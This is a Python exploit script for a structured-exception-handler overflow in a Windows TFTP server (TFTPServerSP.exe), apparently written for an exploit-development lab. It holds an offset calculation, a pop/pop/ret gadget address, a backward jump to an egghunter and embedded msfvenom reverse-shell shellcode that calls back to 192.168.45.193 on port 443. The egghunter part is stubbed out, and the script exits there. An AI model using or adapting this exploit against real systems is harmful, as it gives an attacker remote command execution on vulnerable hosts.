#!/usr/bin/python3

from struct import pack
import pwn
import socket
import sys


# attach WinDBG to TFTPServerSP.exe
# restart application with: net stop TFTPServer ; net start TFTPServer


def main() :
    server = sys.argv[1]
    payload = buildPayload()
    sendPayload(server, payload)


# 0:008> !nmod
# 00400000 00421000 TFTPServerSP         /SafeSEH OFF                C:\Program Files\TFTPServer\TFTPServerSP.exe

def buildPayload():
    payloadSize = 0x2000
    badchars    = b"\x00\x2f"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    # buf += pwn.cyclic(payloadSize)
    offBufSeh = 0x4e8                                           # pwn.cyclic_find(0x6d61616f)
    backJump  = 0x70                                            # from overwritten SEH

    buf  = b""
    buf += egg()
    buf += nopsled()
    buf += shellcode()
    buf += b"A" * (offBufSeh - len(buf) - 4 - backJump)         # padding to align SEH PPR
    tmpLen1 = len(buf)
    buf += nopsled()
    buf += egghunter()
    buf += b"\x90" * (backJump - (len(buf) - tmpLen1))          # padding egghunter to length of / to fill backJump

    # buf += b"\xcc\x90\x90\x90"
    buf += b"\xeb" + bytes([0xff+1-backJump]) + b"\x90\x90"     # jump backwards to egghunter: = pwn.asm(f"jmp $ - {backJump} ; nop ; nop")

    # note: very last byte of PPR ROP gadget address (null-byte) is a bad char and terminates payload
    # that is allowed => we place check for bad characters here before that address
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    buf += pack("<I", 0x004167b1)                               # SEH pop/pop/ret

    buf += b"Z" * (payloadSize - len(buf))                      # padding to fixate payloadSize

    assert len(buf) == payloadSize, "Mismatching size: f{len(buf)} != f{payloadSize}"

    return buf


def egg():
    return b"w00tw00t"

def nopsled(length=0x10):
    return b"\x90" * length

def shellcode():
    buf  = b""

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.193 LPORT=443 -f python -v buf -b "\x00\x2f"
    # nc -vlnp 443
    buf += b"\xd9\xc7\xbb\x04\xb6\xa7\xad\xd9\x74\x24\xf4\x5a"
    buf += b"\x31\xc9\xb1\x52\x31\x5a\x17\x83\xea\xfc\x03\x5e"
    buf += b"\xa5\x45\x58\xa2\x21\x0b\xa3\x5a\xb2\x6c\x2d\xbf"
    buf += b"\x83\xac\x49\xb4\xb4\x1c\x19\x98\x38\xd6\x4f\x08"
    buf += b"\xca\x9a\x47\x3f\x7b\x10\xbe\x0e\x7c\x09\x82\x11"
    buf += b"\xfe\x50\xd7\xf1\x3f\x9b\x2a\xf0\x78\xc6\xc7\xa0"
    buf += b"\xd1\x8c\x7a\x54\x55\xd8\x46\xdf\x25\xcc\xce\x3c"
    buf += b"\xfd\xef\xff\x93\x75\xb6\xdf\x12\x59\xc2\x69\x0c"
    buf += b"\xbe\xef\x20\xa7\x74\x9b\xb2\x61\x45\x64\x18\x4c"
    buf += b"\x69\x97\x60\x89\x4e\x48\x17\xe3\xac\xf5\x20\x30"
    buf += b"\xce\x21\xa4\xa2\x68\xa1\x1e\x0e\x88\x66\xf8\xc5"
    buf += b"\x86\xc3\x8e\x81\x8a\xd2\x43\xba\xb7\x5f\x62\x6c"
    buf += b"\x3e\x1b\x41\xa8\x1a\xff\xe8\xe9\xc6\xae\x15\xe9"
    buf += b"\xa8\x0f\xb0\x62\x44\x5b\xc9\x29\x01\xa8\xe0\xd1"
    buf += b"\xd1\xa6\x73\xa2\xe3\x69\x28\x2c\x48\xe1\xf6\xab"
    buf += b"\xaf\xd8\x4f\x23\x4e\xe3\xaf\x6a\x95\xb7\xff\x04"
    buf += b"\x3c\xb8\x6b\xd4\xc1\x6d\x3b\x84\x6d\xde\xfc\x74"
    buf += b"\xce\x8e\x94\x9e\xc1\xf1\x85\xa1\x0b\x9a\x2c\x58"
    buf += b"\xdc\x65\x18\x4f\xdd\x0e\x5b\x8f\xdc\x75\xd2\x69"
    buf += b"\xb4\x99\xb3\x22\x21\x03\x9e\xb8\xd0\xcc\x34\xc5"
    buf += b"\xd3\x47\xbb\x3a\x9d\xaf\xb6\x28\x4a\x40\x8d\x12"
    buf += b"\xdd\x5f\x3b\x3a\x81\xf2\xa0\xba\xcc\xee\x7e\xed"
    buf += b"\x99\xc1\x76\x7b\x34\x7b\x21\x99\xc5\x1d\x0a\x19"
    buf += b"\x12\xde\x95\xa0\xd7\x5a\xb2\xb2\x21\x62\xfe\xe6"
    buf += b"\xfd\x35\xa8\x50\xb8\xef\x1a\x0a\x12\x43\xf5\xda"
    buf += b"\xe3\xaf\xc6\x9c\xeb\xe5\xb0\x40\x5d\x50\x85\x7f"
    buf += b"\x52\x34\x01\xf8\x8e\xa4\xee\xd3\x0a\xd4\xa4\x79"
    buf += b"\x3a\x7d\x61\xe8\x7e\xe0\x92\xc7\xbd\x1d\x11\xed"
    buf += b"\x3d\xda\x09\x84\x38\xa6\x8d\x75\x31\xb7\x7b\x79"
    buf += b"\xe6\xb8\xa9"

    return buf

def egghunter():
    buf  = b""
    # ./assemble.py egghunter-seh-win10.asm python
    print("[!] Egghunter omitted...") ; exit(1)
    return buf


def sendPayload(server, payload):
    print("[+] Sending payload")
    buf = b"\x00\x02" + payload + b"\x00" + b"netascii" + b"\x00"

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(buf, (server, 69))


if __name__ == "__main__":
    main()
